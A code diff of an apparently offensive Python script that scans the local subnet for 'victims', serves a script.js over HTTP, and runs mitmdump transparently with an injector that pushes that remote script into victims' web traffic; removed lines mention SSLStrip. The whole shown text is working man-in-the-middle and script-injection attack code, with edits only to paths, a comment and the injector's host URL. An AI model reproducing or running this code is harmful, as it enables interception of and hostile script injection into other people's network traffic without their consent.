@@ -8,7 +8,7 @@ def get_victims(gateway):
     range = gateway.split('.')
     del range[3]
     range = '.'.join(range) + '.1-255'
-    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use arp -a to get connected devices
+    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use nmap -n to get connected devices
     ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list of ip's
     
     if not os.path.isfile(whitelist):
@@ -47,12 +47,6 @@ for victim in victims:
 
 # start the http server for serving the script.js, in a new console
 os.system("xterm -hold -e 'python3 httpServer.py' &")
-print("HTTP Server Run")
-
-# run SSLStrip on port 8080
-#os.system("xterm -hold -e 'sudo sslstrip -l 8080' &")
-#print("SSLStrip Run")
 
 # start the mitmproxy
-os.system("/usr/bin/mitmdump -s 'injector.py http//172.16.96.131:1337/script.js' -T")
-print("MITMProxy Run")
+os.system("~/.local/bin/mitmdump -s 'new_injector.py http://192.168.0.14:8000/script.js' -T")
